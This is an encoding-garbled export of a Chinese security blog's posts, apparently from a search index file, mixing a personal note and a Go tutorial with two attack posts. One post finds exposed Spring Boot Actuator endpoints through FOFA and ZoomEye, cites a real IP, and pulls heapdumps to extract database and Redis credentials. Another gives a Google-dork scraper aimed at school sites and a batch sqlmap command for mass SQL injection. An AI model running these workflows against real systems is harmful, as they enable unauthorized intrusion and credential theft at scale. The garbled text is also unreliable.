åº”ç”¨çš„æ•°æ®åº“æ›´æ”¹é›†çš„ä¿¡æ¯ã€‚/actuator/logfilelogfileç«¯ç‚¹æä¾›å¯¹åº”ç”¨ç¨‹åºæ—¥å¿—æ–‡ä»¶å†…å®¹çš„è®¿é—®ã€‚/actuator/loggersloggersç«¯ç‚¹æä¾›å¯¹åº”ç”¨ç¨‹åºè®°å½•å™¨åŠå…¶çº§åˆ«é…ç½®çš„è®¿é—®ã€‚/actuator/mappingsmappingsç«¯ç‚¹æä¾›æœ‰å…³åº”ç”¨ç¨‹åºè¯·æ±‚æ˜ å°„çš„ä¿¡æ¯ã€‚/actuator/metricsmetricsç«¯ç‚¹æä¾›å¯¹åº”ç”¨ç¨‹åºæŒ‡æ ‡çš„è®¿é—®ã€‚/actuator/prometheusç«¯ç‚¹ä»¥prometheusPrometheus æœåŠ¡å™¨æŠ“å–æ‰€éœ€çš„æ ¼å¼æä¾› Spring Boot åº”ç”¨ç¨‹åºçš„æŒ‡æ ‡ã€‚/actuator/quartzquartzç«¯ç‚¹æä¾›æœ‰å…³ç”± Quartz è°ƒåº¦ç¨‹åºç®¡ç†çš„ä½œä¸šå’Œè§¦å‘å™¨çš„ä¿¡æ¯ã€‚/actuator/scheduledtasksscheduledtasksç«¯ç‚¹æä¾›æœ‰å…³åº”ç”¨ç¨‹åºè®¡åˆ’ä»»åŠ¡çš„ä¿¡æ¯ã€‚/actuator/sessionssessionsç«¯ç‚¹æä¾›æœ‰å…³ç”± Spring Session ç®¡ç†çš„åº”ç”¨ç¨‹åº HTTP ä¼šè¯çš„ä¿¡æ¯ã€‚/actuator/startupstartupç«¯ç‚¹æä¾›æœ‰å…³åº”ç”¨ç¨‹åºå¯åŠ¨é¡ºåºçš„ä¿¡æ¯ã€‚/actuator/shutdownshutdownç«¯ç‚¹ç”¨äºå…³é—­åº”ç”¨ç¨‹åº æ¼æ´åˆ©ç”¨å¦‚ä½•æ‰¾åˆ°äº’è”ç½‘ä¸Šçš„Springæ¡†æ¶ï¼ŒZoomEyeè¯­æ³•å¦‚ä¸‹ï¼š 1app:&quot;Spring Framework&quot; Fofaè¯­æ³•å¦‚ä¸‹ï¼š 1icon_hash=&quot;116323821&quot;||body=&quot;Whitelabel Error Page&quot; ç„¶åfofaå¯¼å‡ºæ•°æ®ï¼Œç”¨æ›¾å“¥çš„å·¥å…·æ‰¹é‡æ‰« 1SpringBoot-Scan -uf url.txt æ¯”å¦‚æ‰«åˆ°ä¸€ä¸ª Actuator æ³„æ¼ http://112.74.56.123:60021/actuator å¯ä»¥ä¸‹è½½ä¸€ä¸‹ &#x2F;actuator&#x2F;heapdump Heap Dumpä¹Ÿå«å †è½¬å‚¨æ–‡ä»¶ï¼Œæ˜¯ä¸€ä¸ªJavaè¿›ç¨‹åœ¨æŸä¸ªæ—¶é—´ç‚¹ä¸Šçš„å†…å­˜å¿«ç…§ã€‚Heap Dumpæ˜¯æœ‰ç€å¤šç§ç±»å‹çš„ã€‚ä¸è¿‡æ€»ä½“ä¸Šheap dumpåœ¨è§¦å‘å¿«ç…§çš„æ—¶å€™éƒ½ä¿å­˜äº†javaå¯¹è±¡å’Œç±»çš„ä¿¡æ¯ã€‚é€šå¸¸åœ¨å†™heap dumpæ–‡ä»¶å‰ä¼šè§¦å‘ä¸€æ¬¡FullGCï¼Œæ‰€ä»¥heap dumpæ–‡ä»¶ä¸­ä¿å­˜çš„æ˜¯FullGCåç•™ä¸‹çš„å¯¹è±¡ä¿¡æ¯ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡Heap Dumpåšå“ªäº›äº‹æƒ…ï¼Ÿ ä¸€èˆ¬åœ¨Heap Dumpæ–‡ä»¶ä¸­å¯ä»¥è·å–åˆ°ï¼ˆè¿™ä»ç„¶å–å†³äºheap dumpæ–‡ä»¶çš„ç±»å‹ï¼‰å¦‚ä¸‹ä¿¡æ¯ï¼š å¯¹è±¡ä¿¡æ¯ï¼šç±»ã€æˆå‘˜å˜é‡ã€ç›´æ¥é‡ä»¥åŠå¼•ç”¨å€¼ï¼›ç±»ä¿¡æ¯ï¼šç±»åŠ è½½å™¨ã€åç§°ã€è¶…ç±»ã€é™æ€æˆå‘˜ï¼›Garbage Collections Rootsï¼šJVMå¯è¾¾çš„å¯¹è±¡ï¼›çº¿ç¨‹æ ˆä»¥åŠæœ¬åœ°å˜é‡ï¼šè·å–å¿«ç…§æ—¶çš„çº¿ç¨‹æ ˆä¿¡æ¯ï¼Œä»¥åŠå±€éƒ¨å˜é‡çš„è¯¦ç»†ä¿¡æ¯ã€‚ä¸€èˆ¬åœ¨æ¸—é€æµ‹è¯•ä¸­æˆ‘ä»¬ä¼šé€šè¿‡Eclipse MemoryAnalyzerå·¥å…·å¯¹æ³„éœ²çš„heapdumpæ–‡ä»¶è¿›è¡Œåˆ†æï¼ŒæŸ¥è¯¢åŠ è½½åˆ°å†…å­˜ä¸­çš„æ˜æ–‡å¯†ç ä¿¡æ¯,æ¯”å¦‚rediså¯†ç ,mysqlæ•°æ®åº“è´¦å·å’Œå¯†ç ã€‚ä½†æ˜¯è¿™æ ·å¯èƒ½å¯¼è‡´è·å–çš„æ•æ„Ÿä¿¡æ¯ä¸å…¨é¢ï¼Œç”šè‡³æ— æ³•è·å–åˆ°æ•æ„Ÿä¿¡æ¯ï¼Œä»Šå¤©æ¨èä¸€æ¬¾è‡ªåŠ¨åŒ–åˆ†æheapdumoçš„å·¥å…· - JDumpSpiderã€‚ å¯ä»¥å¾—åˆ°ä¸€ä¸‹ä¿¡æ¯ 12345678910111213141516æ•°æ®æº SpringDataSourceProperties WeblogicDataSourceConnectionPoolConfig MongoClient AliDruidDataSourceWrapperé…ç½®æ–‡ä»¶ä¿¡æ¯ MapPropertySource OriginTrackedMapPropertySource MutablePropertySource ConsulPropertySource OSSï¼ˆæ¨¡ç³Šæœç´¢ï¼‰Redisé…ç½® RedisStandaloneConfiguration JedisClientShiroKey CookieRememberMeManager 1java -jar JDumpSpider-1.1-SNAPSHOT-full.jar /Users/she11f/Downloads/heapdump","tags":["src"],"categories":["src","SpringBoot"]},{"title":"æ‰¹é‡æŒ–æ˜ sql æ³¨å…¥","path":"/2024/12/09/src/æ‰¹é‡æŒ–æ˜sqlæ³¨å…¥/","content":"sql æ³¨å…¥è„šæœ¬ æŸ¥è¯¢è„šæœ¬ search.py 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960import requestsfrom lxml import etreeimport timedef create_requests(page,data): url=&quot;https://www.google.com/search?q=&quot;+data+&quot;&amp;lr=lang_zh-CN&amp;start=&#123;&#125;&quot;.format(page)+&quot;&amp;ie=utf-8&quot; header=&#123; &quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36&quot; &#125; proxy=&#123; &quot;http&quot;:&quot;127.0.0.1:10809&quot;, &quot;https&quot;:&quot;127.0.0.1:10809&quot; &#125; response=requests.get(url=url,headers=header,proxies=proxy) response.encoding=&quot;utf-8&quot; context=response.text return contextdef parse_data(context): parse=etree.HTML(context) data=parse.xpath(&#x27;//*/@href&#x27;) f=open(r&quot;url.txt&quot;,&quot;a&quot;) for url in data: if &quot;/search?&quot; in url: continue if &quot;google.com&quot; in url: continue if &quot;.jpg&quot; in url: continue if &quot;jpeg&quot; in url: continue if &quot;png&quot; in url: continue if &quot;#&quot; in url: continue if &quot;%&quot; in url: continue if &quot;url=https://&quot; in url: continue if &quot;url=http://&quot; in url: continue if &quot;.pdf&quot; in url: continue if &quot;.htm&quot; in url: continue if &quot;.htmls&quot; in url: continue if &quot;.html&quot; in url: continue if &quot;.gov.cn&quot; in url: continue break f.write(url+&quot; &quot;) print(url+&quot;æˆåŠŸå†™å…¥&quot;) f.close()if __name__ == &#x27;__main__&#x27;: data = input(&quot;è¯·è¾“å…¥Googleè¯­æ³•:&quot;) print(&quot;----------------------å¼€å§‹æŠ“å–----------------------&quot;) for page in range(0,int(input(&quot;è¯·è¾“å…¥ç»“æŸé¡µé¢çš„å€æ•°:&quot;)),10): context=create_requests(page,data) parse_data(context) print(&quot;----------------------æŠ“å–å®Œæ¯•----------------------&quot;) å…è®¸è¾“å…¥è°·æ­Œè¯­æ³•å…³é”®è¯ intext:å­¦æ ¡ inurl:&quot;php?id&quot;|&quot;do?id&quot;|&quot;asp?id&quot; ç„¶åæˆ‘ä»¬å°±èƒ½å‘ç° url.txt æ–‡ä»¶ä¸‹å·²ç»çˆ¬åˆ°äº†æˆ‘ä»¬æƒ³è¦çš„åŸŸåï¼Œæ¥ä¸‹æ¥äº¤ç»™ sqlmap æ‰¹é‡è·‘ 123456789sqlmap -m url.txt --dbs --batch --random-agent -p &quot;id&quot; --output-dir result --force-ssl --proxy http://127.0.0.1:8080-mæ‰¹é‡æ“ä½œ--dbsæ•°æ®åº“å--batchè‡ªåŠ¨é€‰æ‹©yes--random-agentä¸å†ä½¿ç”¨é»˜è®¤User-Agentï¼Œéšæœºä½¿ç”¨User-Agent-på‚æ•°--output-dirè¾“å‡ºç»“æœæ–‡ä»¶å¤¹--force-ssl --proxy http://127.0.0.1:8080 ä¸ºäº†èƒ½æ‰«æhttpsï¼Œç”¨bpä»£ç†æœ¬åœ°8080ç«¯å£ å¦‚æœ result æ–‡ä»¶å¤¹ä¸‹çš„æ¯ä¸ªç»“æœé‡Œçš„ log æ–‡ä»¶ä¸ä¸ºç©ºè¯´æ˜æœ‰ç»“æœäº†,æ‰€ä»¥æ‰«æç»“æŸåå¯ä»¥å†™ä¸€ä¸ªæ£€æµ‹è„šæœ¬ exits.py 123456789101112131415161718import osimport shutildef get_exists(path,sum): sum=0 for root,dirs,files in os.walk(path): log_path=os.path.join(root,&quot;log&quot;) if os.path.isfile(log_path) and os.path.getsize(log_path)==0: shutil.rmtree(root) else: sum+=1 print(root+&quot;\\tæ³¨å…¥æˆåŠŸ&quot;) continue return sumif __name__ == &#x27;__main__&#x27;: path=r&quot;/Users/she11f/Documents/Code/Python/script/sql_auto/result&quot; print(&quot;--------------------å¼€å¯æ‰§è¡Œ--------------------&quot;) sum=get_exists(path,sum) print(&quot;--------------------æˆåŠŸæ‰¾åˆ°&#123;&#125;æ³¨å…¥ç‚¹--------------------&quot;.format(sum))","tags":["src"],"categories":["src","sql"]},{"path":"/2024/10/07/work/ä¿ç ”æ„Ÿæ‚Ÿ/","content":"å…³äºæœªæ¥çš„ä¸€äº›è®¡åˆ’ æ—¶é—´é£é€ï¼Œè½¬çœ¼å°±å¤§å››äº†ã€‚å¯ä»¥æ„Ÿå—åˆ°å¤§å®¶çš„è¿·èŒ«å’Œç´§è¿«æ„Ÿï¼Œä¸è¿‡å¹¸è¿çš„æ˜¯æˆ‘ä¿ç ”äº†ï¼Œè™½ç„¶ä¿ç ”çš„é™¢æ ¡å’Œä¸“ä¸šå’Œæˆ‘é¢„æƒ³çš„ä¸å¤ªä¸€æ ·ï¼Œä½†æ˜¯å¯èƒ½å¯¹æˆ‘æ¥è¯´æ˜¯æœ€å¥½çš„ç»“æœäº†ï¼ŒåŒ…æ‹¬å¤§å››è¿™ä¸€å¹´æˆ‘å¯ä»¥å¤šå‡ºå››å¹´çš„ç¼“å†²æ—¶é—´ï¼Œåœ¨è¿™æ®µæ—¶é—´é‡Œæˆ‘å¯ä»¥æ›´å¥½çš„æ€è€ƒæœªæ¥é“è·¯ï¼Œæˆ–ç»§ç»­å­¦ä¹ ç½‘ç»œå®‰å…¨ï¼Œæˆ–è€ƒå…¬ï¼Œæˆ–ç§‘ç ”ã€‚ æˆ‘æš‚æ—¶æŠŠç»¿ç›Ÿçš„å·¥ä½œè¾æ‰äº†ï¼Œé£å“¥è¯´æˆ‘æƒ³å›æ¥å°±å›æ¥ï¼Œä¼šæ›¿æˆ‘æš‚æ—¶ä¿ç•™å·¥ä½åˆ°æ˜å¹´å¼€å­¦ã€‚éå¸¸æ„Ÿè°¢å—æ˜Œç»¿ç›Ÿå„ä½å¤§ä½¬åšçˆ±ï¼Œä»–ä»¬åœ¨å·¥ä½œï¼Œç”Ÿæ´»ä¸Šéƒ½æ˜¯éå¸¸ç…§é¡¾æˆ‘ï¼Œæˆ‘è¾èŒçš„åŸå› æ˜¯ç”±äºè‡ªå·±æ‰‹ä¸Šæœ‰ä¸€å †äº‹æƒ…æš‚æ—¶å¿™ä¸è¿‡æ¥ï¼Œç­‰å¿™å®Œæ‰‹ä¸Šçš„äº‹è‚¯å®šæ˜¯è¦ç»§ç»­å»å·¥ä½œçš„ã€‚ ç”Ÿæ´»ä¸ºä»€ä¹ˆæ˜¯ç”Ÿæ´»ç¬¬ä¸€ä½å‘¢ï¼Œå› ä¸ºæˆ‘è§‰å¾—æ‰€æœ‰çš„ä¸€åˆ‡éƒ½æ˜¯ä¸ºäº†ç”Ÿæ´»æ›´åŠ å¹¸ç¦è€ŒæœåŠ¡çš„ã€‚é¦–å…ˆå°±æ˜¯é”»ç‚¼èº«ä½“äº†ï¼Œå’Œå®¤å‹ä¸€èµ·åŠäº†ä¸€å¼ å¥èº«æˆ¿çš„å¹´å¡ï¼Œæˆ‘è¦å˜çš„æ›´å¤§æ›´å¼ºï¼ï¼ï¼ï¼ˆæŒ‡è‚Œè‚‰ è¿˜æœ‰å¤šé™ªå®¶äººï¼Œå¤šå’Œå®¶äººæ‰“æ‰“è§†é¢‘ç”µè¯ï¼Œåˆ°å¤„è½¬è½¬æ—…æ¸¸èµ·æ¥ã€‚ å­¦ä¹ å¤§å››çš„è¯ï¼Œç›®å‰çš„æƒ³æ³•æ˜¯å¸¦ç€ç¤¾å›¢çš„å­¦å¼Ÿä»¬æ‰“ä¸€æ‰“æ¯”èµ›ï¼Œç„¶åæˆ‘è‡ªå·±å­¦ä¸€å­¦å®‰å…¨å¼€å‘ä¸ºæ¯•è®¾åšå‡†å¤‡ï¼Œç»§ç»­é’»ç ”ä»£ç å®¡è®¡ï¼ˆphpï¼Œjavaï¼‰ï¼Œæœ€åä¹Ÿæ˜¯æƒ³å¤šæ‰“ä¸€äº›æ¯”èµ›å¤šç»“è¯†ä¸€äº›å¿—åŒé“åˆçš„å°ä¼™ä¼´ä»¬ã€‚ å…³äºç ”ç©¶ç”Ÿçš„æš‚æ—¶æ‰“ç®—æ˜¯ï¼Œç›´æ¥æŠŠå­¦ä¸šæ”¾ä¸€æ”¾ï¼Œå¼€å§‹å­¦ä¹ æ¸—é€æ–¹é¢çš„çŸ¥è¯†ã€‚å› ä¸ºè¿„ä»Šä¸ºæ­¢æˆ‘æ›´å¤šçš„è¿˜æ˜¯å‚åŠ  CTF æ¯”èµ›ï¼Œå¯¹äºå®æˆ˜æ„Ÿè§‰æ¥è§¦çš„è¿˜æ˜¯ä¸å¤Ÿå¤šï¼ŒåæœŸä¼°è®¡ä¼šæ‰¾ç›´æ’­è¯¾æ¥å­¦ä¹ ï¼Œç„¶åå°±æ˜¯è‡ªå·±å¤šå‚åŠ ä¸€äº›é¡¹ç›®ä¸°å¯Œè‡ªå·±çš„ç®€å†ä»¥åŠé˜…å†ã€‚å…¶æ¬¡å°±æ˜¯å‡†å¤‡è€ƒå…¬åŠ¡å‘˜äº†ï¼Œè¡Œæµ‹ç”³è®ºçš„è¿™äº›å¯ä»¥ç ”ä¸€å°±åˆ·èµ·æ¥ï¼ˆå…¶å®æˆ‘æœ€æƒ³è¿›çš„å°±æ˜¯é‚£ç§æ‰“æ¯”èµ›çš„å…¬åŠ¡å‘˜å²—ä½ï¼Œæœ‰ç½‘è­¦ç‰¹æ‹›çš„è¯ä¹Ÿæ˜¯å†å¥½ä¸è¿‡äº†ï¼‰ ä¸è®ºæ€æ ·æœ€é‡è¦çš„éƒ½æ˜¯æå‡è‡ªå·±çš„æŠ€æœ¯ï¼Œä¿æŒå­¦ä¹ ï¼Œå¾…æ—¶è€ŒåŠ¨ï¼ æ€»ç»“æƒ³æ‘†çƒ‚ï¼Œæƒ³ä»¥åçš„å·¥ä½œæ´»å°‘é’±å¤šç¦»å®¶è¿‘ï¼Œæ‰€ä»¥åŠªåŠ›å§å°‘å¹´ï¼ï¼ï¼è¿˜æœ‰è¿˜æœ‰ï¼Œçˆ±ä½ ä»¬ğŸ˜˜ï¼ï¼ï¼ æ— é¢˜she11få›å¤´çœ‹ï¼Œè½»èˆŸå·²è¿‡ä¸‡é‡å±±ã€‚å‘å‰çœ‹ï¼Œå‰é€”æ¼«æ¼«äº¦ç¿ç¿ã€‚åæœˆä¸ƒæ—¥","tags":["ç”Ÿæ´»"],"categories":["æ‰“å·¥äººçš„ä¸‰ä¸¤äº‹"]},{"title":"go å…¥é—¨","path":"/2024/10/06/go/å¼€å‘/å…¥é—¨/","content":"ç¬¬ä¸€ä¸ªç¨‹åº hello world123456package mainimport &quot;fmt&quot;func main() &#123;\tfmt.Println(&quot;Hello World&quot;)&#125; go run hello.go æ‰§è¡Œç¨‹åºä»£ç  åŸºç¡€è¯­æ³•ï¼Œåˆè¯†å‡½æ•°ï¼ŒåŸºæœ¬ç±»å‹packageæˆ‘ä»¬çœ‹åˆ°ç¨‹åºçš„ç¬¬ä¸€è¡Œæ˜¯ package main,åœ¨Goè¯­è¨€ä¸­ï¼ŒåŒ…ï¼ˆPackageï¼‰ æ˜¯ä¸€ç§ç”¨äºç»„ç»‡ä»£ç çš„æœºåˆ¶ï¼Œç”¨äºå°†ç›¸å…³çš„å‡½æ•°ã€ç±»å‹å’Œå˜é‡ç­‰ç»„ç»‡åœ¨ä¸€èµ·ï¼Œä»¥ä¾¿äºæ¨¡å—åŒ–å¼€å‘å’Œä»£ç å¤ç”¨ã€‚åŒ…çš„ä½¿ç”¨èƒ½å¤Ÿä½¿ç¨‹åºç»“æ„æ›´åŠ æ¸…æ™°ã€å¯ç»´æŠ¤æ€§æ›´é«˜ï¼ŒåŒæ—¶ä¹Ÿæ˜¯Goè¯­è¨€å¼ºè°ƒçš„ä¸€é¡¹é‡è¦ç‰¹æ€§ funcåœ¨goé‡Œé¢ï¼Œå½“å‡½æ•°åå¼€å¤´æ˜¯å°å†™çš„è¯ï¼Œæ„æ€è¿™ä¸ªå‡½æ•°åªèƒ½åœ¨å½“å‰åŒ…ç”¨ï¼Œæ˜¯ç§æœ‰çš„ï¼Œåªèƒ½åœ¨åŒ…çš„å†…éƒ¨ä½¿ç”¨ï¼Œå¦‚æœæ˜¯å¤§å†™ï¼Œåˆ™å…¬æœ‰ï¼Œå¯ä»¥å¯¼å‡ºé£Ÿç”¨ã€‚ åŸºæœ¬ç±»å‹å­—ç¬¦ä¸²Goè¯­è¨€ä¸­çš„å­—ç¬¦ä¸²ä»¥åŸç”Ÿæ•°æ®ç±»å‹å‡ºç°ï¼Œä½¿ç”¨å­—ç¬¦ä¸²å°±åƒä½¿ç”¨å…¶ä»–åŸç”Ÿæ•°æ®ç±»å‹ï¼ˆintã€boolã€float32ã€float64 ç­‰ï¼‰ä¸€æ ·ã€‚ Go è¯­è¨€é‡Œçš„å­—ç¬¦ä¸²çš„å†…éƒ¨å®ç°ä½¿ç”¨UTF-8ç¼–ç ã€‚ å­—ç¬¦ä¸²çš„å€¼ä¸ºåŒå¼•å·(â€œ)ä¸­çš„å†…å®¹ã€‚ 1234s1 := &quot;aaa&quot;fmt.Println(s1)&gt; aaa å­—ç¬¦ç»„æˆæ¯ä¸ªå­—ç¬¦ä¸²çš„å…ƒç´ å«åšâ€œå­—ç¬¦â€ï¼Œå¯ä»¥é€šè¿‡éå†æˆ–è€…å•ä¸ªè·å–å­—ç¬¦ä¸²å…ƒç´ è·å¾—å­—ç¬¦ã€‚ å­—ç¬¦ç”¨å•å¼•å·ï¼ˆâ€™ï¼‰åŒ…è£¹èµ·æ¥ï¼Œå¦‚ï¼š 12var a := &#x27;ä¸­&#x27;var b := &#x27;x&#x27; å­—ç¬¦ç±»å‹åœ¨ go ä¸­æ˜¯ runeï¼Œruneç±»å‹å®é™…æ˜¯ä¸€ä¸ªint32ï¼Œå¯ä»¥è¡¨ç¤ºä¸€ä¸ª unicode ç ç‚¹ 1234s1 := &quot;a&quot;fmt.Println(s1)&gt; 97 æ•´å½¢æ•´å‹åˆ†ä¸ºä»¥ä¸‹ä¸¤ä¸ªå¤§ç±»ï¼š æŒ‰é•¿åº¦åˆ†ä¸ºï¼šint8ã€int16ã€int32ã€int64å¯¹åº”çš„æ— ç¬¦å·æ•´å‹ï¼šuint8ã€uint16ã€uint32ã€uint64 å…¶ä¸­ï¼Œuint8å°±æ˜¯æˆ‘ä»¬ç†ŸçŸ¥çš„byteå‹ï¼Œint16å¯¹åº”Cè¯­è¨€ä¸­çš„shortå‹ï¼Œint64å¯¹åº”Cè¯­è¨€ä¸­çš„longå‹ã€‚ æµ®ç‚¹å‹Goè¯­è¨€æ”¯æŒä¸¤ç§æµ®ç‚¹å‹æ•°ï¼šfloat32å’Œfloat64ã€‚è¿™ä¸¤ç§æµ®ç‚¹å‹æ•°æ®æ ¼å¼éµå¾ªIEEE 754æ ‡å‡†ï¼š float32 çš„æµ®ç‚¹æ•°çš„æœ€å¤§èŒƒå›´çº¦ä¸º3.4e38ï¼Œå¯ä»¥ä½¿ç”¨å¸¸é‡å®šä¹‰ï¼šmath.MaxFloat32ã€‚ float64 çš„æµ®ç‚¹æ•°çš„æœ€å¤§èŒƒå›´çº¦ä¸º 1.8e308ï¼Œå¯ä»¥ä½¿ç”¨ä¸€ä¸ªå¸¸é‡å®šä¹‰ï¼šmath.MaxFloat64ã€‚ å¸ƒå°”å€¼Goè¯­è¨€ä¸­ä»¥boolç±»å‹è¿›è¡Œå£°æ˜å¸ƒå°”å‹æ•°æ®ï¼Œå¸ƒå°”å‹æ•°æ®åªæœ‰trueï¼ˆçœŸï¼‰å’Œfalseï¼ˆå‡ï¼‰ä¸¤ä¸ªå€¼ã€‚ 1234567æ³¨æ„ï¼šå¸ƒå°”ç±»å‹å˜é‡çš„é»˜è®¤å€¼ä¸ºfalseã€‚Go è¯­è¨€ä¸­ä¸å…è®¸å°†æ•´å‹å¼ºåˆ¶è½¬æ¢ä¸ºå¸ƒå°”å‹.å¸ƒå°”å‹æ— æ³•å‚ä¸æ•°å€¼è¿ç®—ï¼Œä¹Ÿæ— æ³•ä¸å…¶ä»–ç±»å‹è¿›è¡Œè½¬æ¢ã€‚ å˜é‡å£°æ˜12345678910var s1 strings1 = &quot;aaa&quot;s2 := &quot;aaa&quot;var s3, s4 strings5,s6 := &quot;G&quot;,&quot;o&quot;// ä½¿ç”¨åŒ¿åå˜é‡æ¥å¿½ç•¥å‡½æ•°çš„è¿”å›å€¼ã€ä¸´æ—¶å­˜å‚¨å€¼ï¼Œä»¥åŠåœ¨éœ€è¦å¿½ç•¥æŸäº›è¿”å›å€¼çš„æƒ…å†µä¸‹ä½¿ç”¨ã€‚è¯·æ³¨æ„ï¼ŒåŒ¿åå˜é‡ä¸èƒ½è¢«é‡æ–°èµ‹å€¼æˆ–åœ¨å…¶ä»–åœ°æ–¹ä½¿ç”¨ï¼Œä½œç”¨ä»…é™äºè¢«å£°æ˜çš„ä½ç½®ã€‚_, _ = 10, 20 è¿ç®—ç¬¦Go è¯­è¨€å†…ç½®çš„è¿ç®—ç¬¦æœ‰ï¼š 12345ç®—æœ¯è¿ç®—ç¬¦å…³ç³»è¿ç®—ç¬¦é€»è¾‘è¿ç®—ç¬¦ä½è¿ç®—ç¬¦èµ‹å€¼è¿ç®—ç¬¦ ç®—æ•°è¿ç®—ç¬¦ è¿ç®—ç¬¦ æè¿° + ç›¸åŠ  - ç›¸å‡ * ç›¸ä¹˜ &#x2F; ç›¸é™¤ % æ±‚ä½™ æ³¨æ„ï¼š ++ï¼ˆè‡ªå¢ï¼‰å’Œâ€“ï¼ˆè‡ªå‡ï¼‰åœ¨Goè¯­è¨€ä¸­æ˜¯å•ç‹¬çš„è¯­å¥ï¼Œå¹¶ä¸æ˜¯è¿ç®—ç¬¦ã€‚ å…³ç³»è¿ç®—ç¬¦ è¿ç®—ç¬¦ æè¿° &#x3D;&#x3D; æ£€æŸ¥ä¸¤ä¸ªå€¼æ˜¯å¦ç›¸ç­‰ï¼Œå¦‚æœç›¸ç­‰è¿”å› True å¦åˆ™è¿”å› Falseã€‚ !&#x3D; æ£€æŸ¥ä¸¤ä¸ªå€¼æ˜¯å¦ä¸ç›¸ç­‰ï¼Œå¦‚æœä¸ç›¸ç­‰è¿”å› True å¦åˆ™è¿”å› Falseã€‚ &gt; æ£€æŸ¥å·¦è¾¹å€¼æ˜¯å¦å¤§äºå³è¾¹å€¼ï¼Œå¦‚æœæ˜¯è¿”å› True å¦åˆ™è¿”å› Falseã€‚ &gt;&#x3D; æ£€æŸ¥å·¦è¾¹å€¼æ˜¯å¦å¤§äºç­‰äºå³è¾¹å€¼ï¼Œå¦‚æœæ˜¯è¿”å› True å¦åˆ™è¿”å› Falseã€‚ &lt; æ£€æŸ¥å·¦è¾¹å€¼æ˜¯å¦å°äºå³è¾¹å€¼ï¼Œå¦‚æœæ˜¯è¿”å› True å¦åˆ™è¿”å› Falseã€‚ &lt;&#x3D; æ£€æŸ¥å·¦è¾¹å€¼æ˜¯å¦å°äºç­‰äºå³è¾¹å€¼ï¼Œå¦‚æœæ˜¯è¿”å› True å¦åˆ™è¿”å› Falseã€‚ é€»è¾‘è¿ç®—ç¬¦ è¿ç®—ç¬¦ æè¿° &amp;&amp; é€»è¾‘ AND è¿ç®—ç¬¦ã€‚ å¦‚æœä¸¤è¾¹çš„æ“ä½œæ•°éƒ½æ˜¯ Trueï¼Œåˆ™ä¸º Trueï¼Œå¦åˆ™ä¸º Falseã€‚ ll é€»è¾‘ OR è¿ç®—ç¬¦ã€‚ å¦‚æœä¸¤è¾¹çš„æ“ä½œæ•°æœ‰ä¸€ä¸ª Trueï¼Œåˆ™ä¸º Trueï¼Œå¦åˆ™ä¸º Falseã€‚ ! é€»è¾‘ NOT è¿ç®—ç¬¦ã€‚ å¦‚æœæ¡ä»¶ä¸º Trueï¼Œåˆ™ä¸º Falseï¼Œå¦åˆ™ä¸º Trueã€‚ ä½è¿ç®—ç¬¦ä½è¿ç®—ç¬¦å¯¹æ•´æ•°åœ¨å†…å­˜ä¸­çš„äºŒè¿›åˆ¶ä½è¿›è¡Œæ“ä½œã€‚ è¿ç®—ç¬¦ æè¿° &amp; å‚ä¸è¿ç®—çš„ä¸¤æ•°å„å¯¹åº”çš„äºŒè¿›ä½ç›¸ä¸ã€‚ï¼ˆä¸¤ä½å‡ä¸º1æ‰ä¸º1ï¼‰ l å‚ä¸è¿ç®—çš„ä¸¤æ•°å„å¯¹åº”çš„äºŒè¿›ä½ç›¸æˆ–ã€‚ï¼ˆä¸¤ä½æœ‰ä¸€ä¸ªä¸º1å°±ä¸º1ï¼‰ ^ å‚ä¸è¿ç®—çš„ä¸¤æ•°å„å¯¹åº”çš„äºŒè¿›ä½ç›¸å¼‚æˆ–ï¼Œå½“ä¸¤å¯¹åº”çš„äºŒè¿›ä½ç›¸å¼‚æ—¶ï¼Œç»“æœä¸º1ã€‚ï¼ˆä¸¤ä½ä¸ä¸€æ ·åˆ™ä¸º1ï¼‰ &lt;&lt; å·¦ç§»nä½å°±æ˜¯ä¹˜ä»¥2çš„næ¬¡æ–¹ã€‚â€œa&lt;&lt;bâ€æ˜¯æŠŠaçš„å„äºŒè¿›ä½å…¨éƒ¨å·¦ç§»bä½ï¼Œé«˜ä½ä¸¢å¼ƒï¼Œä½ä½è¡¥0ã€‚ &gt;&gt; å³ç§»nä½å°±æ˜¯é™¤ä»¥2çš„næ¬¡æ–¹ã€‚â€œa&gt;&gt;bâ€æ˜¯æŠŠaçš„å„äºŒè¿›ä½å…¨éƒ¨å³ç§»bä½ã€‚ èµ‹å€¼è¿ç®—ç¬¦ è¿ç®—ç¬¦ æè¿° &#x3D; ç®€å•çš„èµ‹å€¼è¿ç®—ç¬¦ï¼Œå°†ä¸€ä¸ªè¡¨è¾¾å¼çš„å€¼èµ‹ç»™ä¸€ä¸ªå·¦å€¼ +&#x3D; ç›¸åŠ åå†èµ‹å€¼ -&#x3D; ç›¸å‡åå†èµ‹å€¼ *&#x3D; ç›¸ä¹˜åå†èµ‹å€¼ &#x2F;&#x3D; ç›¸é™¤åå†èµ‹å€¼ %&#x3D; æ±‚ä½™åå†èµ‹å€¼ &lt;&lt;&#x3D; å·¦ç§»åèµ‹å€¼ &gt;&gt;&#x3D; å³ç§»åèµ‹å€¼ &amp;&#x3D; æŒ‰ä½ä¸åèµ‹å€¼ l&#x3D; æŒ‰ä½æˆ–åèµ‹å€¼ ^&#x3D; æŒ‰ä½å¼‚æˆ–åèµ‹å€¼ æ•°ç»„ArrayGolang Arrayå’Œä»¥å¾€è®¤çŸ¥çš„æ•°ç»„æœ‰å¾ˆå¤§ä¸åŒã€‚æ•°ç»„é•¿åº¦å¿…é¡»æ˜¯å¸¸é‡ï¼Œä¸”æ˜¯ç±»å‹çš„ç»„æˆéƒ¨åˆ†ã€‚ä¸€æ—¦å®šä¹‰ï¼Œé•¿åº¦ä¸èƒ½å˜ã€‚ 1234arrs := [3]int&#123;1, 2, 3&#125;arr := [...]int&#123;1, 2&#125;c := [5]int&#123;3: 100, 4: 500&#125;d := [2][3]int&#123;&#123;1, 2, 3&#125;, &#123;4, 5, 6&#125;&#125; é•¿åº¦æ˜¯æ•°ç»„ç±»å‹çš„ä¸€éƒ¨åˆ†ï¼Œå› æ­¤ï¼Œvar a[5] intå’Œvar a[10]intæ˜¯ä¸åŒçš„ç±»å‹ã€‚ åˆ‡ç‰‡Sliceéœ€è¦è¯´æ˜ï¼Œslice 